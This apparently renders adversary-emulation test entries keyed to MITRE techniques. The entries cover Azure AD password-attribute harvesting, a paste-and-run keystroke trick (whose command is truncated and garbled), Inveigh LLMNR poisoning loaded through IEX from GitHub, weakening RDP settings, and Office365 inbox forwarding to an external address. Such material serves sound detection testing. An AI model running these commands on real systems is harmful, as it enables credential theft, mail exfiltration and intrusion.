<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: ae9b2e3e-efa1-4483-86e2-fae529ab9fb6</li>
<li><strong>name</strong>: Azure - Search Azure AD User Attributes for Passwords</li>
<li>
<p><strong>description</strong>: This test uses the MSOnline Powershell module to retrieve all user attributes for a specified account, which can sometimes contain unsecured credentials. 
Upon successful execution, this test will scan all user attributes for any strings containing "password".
Those unsecured credentials will be output to a text file, as well as the account that they are associated with and the user attribute in which they were found. 
See: https://github.com/dafthack/CloudPentestCheatsheets/blob/master/cheatsheets/Azure.md</p>
</li>
<li>
<p><strong>platforms</strong>: ['azure-ad']</p>
</li>
<li>
<p><strong>command</strong>: import-module msonline
$Password = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Password
Connect-MsolService -Credential $Credential
$users = Get-MsolUser -All;
foreach($user in $users)
{$props = @();$user | Get-Member | foreach-object{$props+=$_.Name}; 
foreach($prop in $props)
{if($user.$prop -like "<em>password</em>")
{("[*]" + $user.UserPrincipalName + "[" + $prop + "]" + " : " + $user.$prop) | out-file -filepath $env:temp\T1552.005Test1.txt -append -force}}}
get-content -path $env:temp\T1552.005Test1.txt -erroraction silentlycontinue</p>
</li>
<li>
<p><strong>prereq_command</strong>: if (get-command Get-MsolUser -erroraction silentlycontinue){exit 0} else {exit 1}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: install-module MSOnline</p>
</li>
<li>
<p><strong>cleanup_command</strong>: remove-item $env:temp\T1552.005Test1.txt -force -erroraction silentlycontinue</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1552.005</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: {'description': 'Azure AD username', 'type': 'string', 'default': None}</li>
<li><strong>input_arguments.password</strong>: {'description': 'Azure AD password', 'type': 'string', 'default': 'T1082Az'}</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: bc177ef9-6a12-4ebc-a2ec-d41e19c2791d</li>
<li><strong>name</strong>: Paste and run technique</li>
<li>
<p><strong>description</strong>: Tests the <strong>Paste and Run</strong> technique, where users are tricked into running
malicious PowerShell commands by automating the Win+R command to open the
Run dialog and input <code>encoded PowerShell to execute calc.exe.</code></p>
</li>
<li>
<p><a href="https://medium.com/@ahmed.moh.farou2/fake-captcha-campaign-on-arabic-pirated-movie-sites-delivers-lumma-stealer-4f203f7adabf">Fake CAPTCHA Campaign</a></p>
</li>
<li>
<p><a href="https://www.proofpoint.com/us/blog/threat-insight/clipboard-compromise-powershell-self-pwn">From Clipboard to Compromise</a></p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li><strong>command</strong>: # Add user32.dll for keybd_event
Add-Type @"
    using System;
    using System.Runtime.InteropServices;
    public class K {
        [DllImport("user32.dll")]
        public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
    }
"@</li>
</ul>
<h1>Virtual key codes</h1>
<p>$VK_LWIN, $VK_R, $KEYDOWN, $KEYUP = 0x5B, 0x52, 0x0000, 0x0002</p>
<h1>Open Run dialog (Win+R)</h1>
<h1>Short delay for Run dialog</h1>
<p>Start-Sleep -Milliseconds 500
Add-Type -AssemblyName System.Windows.Forms</p>
<ul>
<li><strong>prereq_command</strong>: </li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1566.002</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: deecd55f-afe0-4a62-9fba-4d1ba2deb321</li>
<li><strong>name</strong>: LLMNR Poisoning with Inveigh (PowerShell)</li>
<li><strong>description</strong>: Inveigh conducts spoofing attacks and hash/credential captures through both packet sniffing and protocol specific listeners/sockets. This Atomic will run continuously until you cancel it or it times out.</li>
<li><strong>platforms</strong>: ['windows']</li>
<li><strong>command</strong>: [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/82be2377ade47a4e325217b4144878a59595e750/Inveigh.ps1" -UseBasicParsing)
Invoke-Inveigh -ConsoleOutput Y -NBNS Y -MDNS Y -HTTPS Y -PROXY Y</li>
<li><strong>prereq_command</strong>: </li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1557.001</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 2f840dd4-8a2e-4f44-beb3-6b2399ea3771</li>
<li><strong>name</strong>: Changing RDP Port to Non Standard Port via Powershell</li>
<li>
<p><strong>description</strong>: Changing RDP Port to Non Standard Port via Powershell</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "PortNumber" -Value #{NEW_Remote_Port}
New-NetFirewallRule -DisplayName 'RDPPORTLatest-TCP-In' -Profile 'Public' -Direction Inbound -Action Allow -Protocol TCP -LocalPort #{NEW_Remote_Port}</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "PortNumber" -Value #{OLD_Remote_Port}
Remove-NetFirewallRule -DisplayName "RDPPORTLatest-TCP-In" -ErrorAction Ignore 
Get-Service TermService | Restart-Service -Force -ErrorAction Ignore </p>
</li>
<li>
<p><strong>mitre_id</strong>: T1021.001</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 01d1c6c0-faf0-408e-b368-752a02285cb2</li>
<li><strong>name</strong>: Disable NLA for RDP via Command Prompt</li>
<li>
<p><strong>description</strong>: Disables network-level authentication (NLA) for RDP by changing a registry key via Command Prompt
Disabling NLA for RDP can allow remote user interaction with the Windows sign-in screen prior to authentication. According to Microsoft, Flax Typhoon actors used this technique implementation to achieve persistence on victim systems: https://www.microsoft.com/en-us/security/blog/2023/08/24/flax-typhoon-using-legitimate-software-to-quietly-access-taiwanese-organizations/
See also: https://github.com/EmpireProject/Empire/blob/master/lib/modules/powershell/management/enable_rdp.py</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /d 0 /t REG_DWORD /f</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /d #{Default_UserAuthentication} /t REG_DWORD -f &gt;nul 2&gt;&amp;1</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1021.001</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 3234117e-151d-4254-9150-3d0bac41e38c</li>
<li><strong>name</strong>: Office365 - Email Forwarding</li>
<li>
<p><strong>description</strong>: Creates a new Inbox Rule to forward emails to an external user via the "ForwardTo" property of the New-InboxRule Powershell cmdlet.</p>
</li>
<li>
<p><strong>platforms</strong>: ['office-365']</p>
</li>
<li>
<p><strong>command</strong>: $secure_pwd = "#{password}" | ConvertTo-SecureString -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential -ArgumentList "#{username}", $secure_pwd
Connect-ExchangeOnline -Credential $creds
New-InboxRule -Name "#{rule_name}" -ForwardTo "#{forwarding_email}"</p>
</li>
<li>
<p><strong>prereq_command</strong>: $RequiredModule = Get-Module -Name ExchangeOnlineManagement -ListAvailable
if (-not $RequiredModule) {exit 1}
if (-not $RequiredModule.ExportedCommands['Connect-ExchangeOnline']) {exit 1} else {exit 0}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: Install-Module -Name ExchangeOnlineManagement       <br />
Import-Module ExchangeOnlineManagement</p>
</li>
<li>
<p><strong>cleanup_command</strong>: $secure_pwd = "#{password}" | ConvertTo-SecureString -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential -ArgumentList "#{username}", $secure_pwd
Connect-ExchangeOnline -Credential $creds
Get-InboxRule | Where-Object { $<em>.Name -eq "#{rule_name}" | ForEach-Object { Remove-InboxRule -Identity $</em>.Identity -Force -Confirm:$False }</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1114.003</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: {'description': 'office-365 username', 'type': 'string', 'default': None}</li>
<li><strong>input_arguments.password</strong>: {'description': 'office-365 password', 'type': 'string', 'default': None}</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
